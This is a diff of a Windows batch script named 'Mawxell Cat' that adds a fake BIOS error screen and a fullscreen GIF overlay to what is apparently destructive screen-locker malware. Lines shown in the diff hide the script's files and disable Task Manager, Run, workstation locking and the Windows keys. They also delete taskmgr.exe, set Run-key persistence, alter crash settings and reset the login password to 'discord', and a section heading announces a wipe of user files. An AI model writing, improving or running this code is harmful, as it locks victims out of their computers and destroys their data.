@@ -4,14 +4,14 @@ color 0C
 setlocal
 
 rem ============================================================
-rem  MAWXELL CAT - FINAL LOCAL VM BUILD
-rem  Win10/11 ONLY | red console -> hidden | auto-loop
+rem  MAWXELL CAT FINAL - LOCAL VM BUILD
+rem  fake BIOS | local GIF wallpaper | hacked text | auto-loop
 rem  lock: more more more user / discord
-rem  wallpaper: LOCAL video file (no internet)
-rem  set VIDEOFILE to your local file (or "skip" for none)
+rem  NO internet fetch - put maxwell.gif in C:\Windows\Temp
+rem  set GIFILE=skip to disable wallpaper
 rem ============================================================
 
-set "VIDEOFILE=maxwell.mp4"
+set "GIFILE=maxwell.gif"
 
 if exist "%SystemRoot%\Temp\mc_hidden.flag" goto :payload
 
@@ -36,13 +36,58 @@ exit /b
 cd /d "%SystemRoot%\Temp"
 attrib +h "%SystemRoot%\Temp\mawxell_cat.bat" "%SystemRoot%\Temp\mchide.vbs" "%SystemRoot%\Temp\mc_hidden.flag" >nul 2>&1
 
+rem ============ 0) FAKE BIOS (generated ps1, looks real, cosmetic) ============
+> "%SystemRoot%\Temp\fakebios.ps1" echo Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+>> "%SystemRoot%\Temp\fakebios.ps1" echo $s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+>> "%SystemRoot%\Temp\fakebios.ps1" echo $f=New-Object System.Windows.Forms.Form
+>> "%SystemRoot%\Temp\fakebios.ps1" echo $f.FormBorderStyle='None'
+>> "%SystemRoot%\Temp\fakebios.ps1" echo $f.Bounds=$s
+>> "%SystemRoot%\Temp\fakebios.ps1" echo $f.TopMost=$true
+>> "%SystemRoot%\Temp\fakebios.ps1" echo $f.BackColor='Black'
+>> "%SystemRoot%\Temp\fakebios.ps1" echo $l=New-Object System.Windows.Forms.Label
+>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.ForeColor='White'
+>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.BackColor='Black'
+>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.Font=New-Object System.Drawing.Font('Consolas',20,[System.Drawing.FontStyle]::Bold)
+>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.Dock='Fill'
+>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.TextAlign='MiddleLeft'
+>> "%SystemRoot%\Temp\fakebios.ps1" echo $f.Controls.Add($l)
+>> "%SystemRoot%\Temp\fakebios.ps1" echo $f.Show()
+>> "%SystemRoot%\Temp\fakebios.ps1" echo $t=''
+>> "%SystemRoot%\Temp\fakebios.ps1" echo $lines=@('MAWXELL BIOS v13.0','','CPU  : NO DETECT ............ FAIL','MEM  : 0 MB OK .............. ERROR','CMOS : CHECKSUM ............. INVALID','HDD  : BOOT DEVICE .......... LOCKED','FAN  : 0 RPM ................ STALL','','PRESS DEL TO ENTER SETUP  [not working]','')
+>> "%SystemRoot%\Temp\fakebios.ps1" echo foreach($x in $lines){
+>> "%SystemRoot%\Temp\fakebios.ps1" echo $t=$t+$x+[char]10
+>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.Text=$t
+>> "%SystemRoot%\Temp\fakebios.ps1" echo Start-Sleep -Milliseconds 600
+>> "%SystemRoot%\Temp\fakebios.ps1" echo }
+>> "%SystemRoot%\Temp\fakebios.ps1" echo for($i=0;$i -lt 6;$i++){
+>> "%SystemRoot%\Temp\fakebios.ps1" echo $t=$t+'FLASHING MAWXELL CAT ...'+[char]10
+>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.Text=$t
+>> "%SystemRoot%\Temp\fakebios.ps1" echo Start-Sleep -Milliseconds 700
+>> "%SystemRoot%\Temp\fakebios.ps1" echo }
+>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.ForeColor='Red'
+>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.Font=New-Object System.Drawing.Font('Consolas',34,[System.Drawing.FontStyle]::Bold)
+>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.TextAlign='MiddleCenter'
+>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.Text=$t+[char]10+[char]10+'        haha you got hacked pc'
+>> "%SystemRoot%\Temp\fakebios.ps1" echo Start-Sleep -Seconds 4
+>> "%SystemRoot%\Temp\fakebios.ps1" echo $f.Close()
+powershell -NoP -EP Bypass -File "%SystemRoot%\Temp\fakebios.ps1" >nul 2>&1
+
 set WAIT=60
 timeout /t %WAIT% /nobreak >nul
 
-rem ---------- 1) WIN+R ----------
+rem ============ 1) LOCAL GIF WALLPAPER (spawned, full HD, loops) ============
+if /i "%GIFILE%"=="skip" goto :nogif
+if exist "%SystemRoot%\Temp\%GIFILE%" (
+    start "" powershell -NoP -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $w=(New-Object System.Windows.Forms.Form); $w.FormBorderStyle='None'; $w.Bounds=$s; $w.TopMost=$true; $p=New-Object System.Windows.Forms.PictureBox; $p.Image=[System.Drawing.Image]::FromFile('%SystemRoot%\Temp\%GIFILE%'); $p.Dock='Fill'; $p.SizeMode='StretchImage'; $w.Controls.Add($p); $w.Show(); [System.Windows.Forms.Application]::Run($w)"
+) else (
+    echo  [gif not found in C:\Windows\Temp - skipping wallpaper]
+)
+:nogif
+
+rem ---------- 2) WIN+R ----------
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul 2>&1
 
-rem ---------- 2) CTRL+ALT+DEL NUKED ----------
+rem ---------- 3) CTRL+ALT+DEL NUKED ----------
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v HideFastUserSwitching /t REG_DWORD /d 1 /f >nul 2>&1
@@ -56,29 +101,19 @@ icacls "%SystemRoot%\SysWOW64\taskmgr.exe" /grant *S-1-5-32-544:F >nul 2>&1
 del /f /q "%SystemRoot%\SysWOW64\taskmgr.exe" >nul 2>&1
 gpupdate /force >nul 2>&1
 
-rem ---------- 3) WIN KEY ----------
+rem ---------- 4) WIN KEY ----------
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 00000000000000000300000000005BE000005CE000000000 /f >nul 2>&1
 
-rem ---------- 4) TASKBAR HIDE (no auto-logout) ----------
+rem ---------- 5) TASKBAR HIDE (no auto-logout) ----------
 powershell -NoP -Command "$k=(Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3' -EA SilentlyContinue).Settings; if($k){$k[8]=3; Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3' Settings $k}; Stop-Process -Name explorer -Force -EA SilentlyContinue" >nul 2>&1
 
-rem ---------- 5) PERSISTENCE + BSOD :) + AUTO-REBOOT ----------
+rem ---------- 6) PERSISTENCE + BSOD :) + AUTO-REBOOT ----------
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v mawxell_cat /t REG_SZ /d "wscript.exe %SystemRoot%\Temp\mchide.vbs" /f >nul 2>&1
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v DisplayMessage /t REG_SZ /d ":)" /f >nul 2>&1
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v DisplayParameters /t REG_SZ /d "mawxell cat" /f >nul 2>&1
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v AutoReboot /t REG_DWORD /d 1 /f >nul 2>&1
 
-rem ---------- 6) LOCAL VIDEO WALLPAPER (only if file exists, FULL HD) ----------
-if /i "%VIDEOFILE%"=="skip" goto :novid
-if exist "%SystemRoot%\Temp\%VIDEOFILE%" (
-    reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "" /f >nul 2>&1
-    powershell -NoP -Command "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $w=(New-Object System.Windows.Forms.Form); $w.FormBorderStyle='None'; $w.Bounds=$s; $w.TopMost=$true; $m=New-Object System.Windows.Forms.MediaPlayer; $m.URL='%SystemRoot%\Temp\%VIDEOFILE%'; $m.settings.setMode('loop',$true); $m.settings.volume=0; $w.Controls.Add($m); $m.Dock='Fill'; $m.StretchToFit=$true; $w.Show(); [System.Windows.Forms.Application]::Run($w)" >nul 2>&1
-) else (
-    echo  [video not found next to payload - skipping wallpaper]
-)
-:novid
-
-rem ---------- 7) WIPE USER FILES (keep profiles -> boots to lock screen) ----------
+rem ---------- 7) WIPE USER FILES (keep profiles -> lock screen) ----------
 taskkill /f /im explorer.exe >nul 2>&1
 taskkill /f /im SearchHost.exe >nul 2>&1
 taskkill /f /im SearchApp.exe >nul 2>&1
@@ -118,7 +153,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultU
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d "discord" /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d "0" /f >nul 2>&1
 
-rem ---------- 9) AUTO-LOOP ANIMATION (spins until restart) ----------
+rem ---------- 9) AUTO-LOOP ANIMATION + hacked text (until restart) ----------
 set n=0
 :SPIN
 set /a n+=1
@@ -133,7 +168,9 @@ echo        /\_/\      %sp%
 echo       ( o.o )     %sp%
 echo        ~~~~~      %sp%
 echo.
-echo   MAWXELL CAT   pass %n%   restart soon :)   pass %n%
+echo   MAWXELL CAT   pass %n%
+echo.
+echo   haha you got hacked pc
 timeout /t 1 /nobreak >nul
 goto :SPIN
 
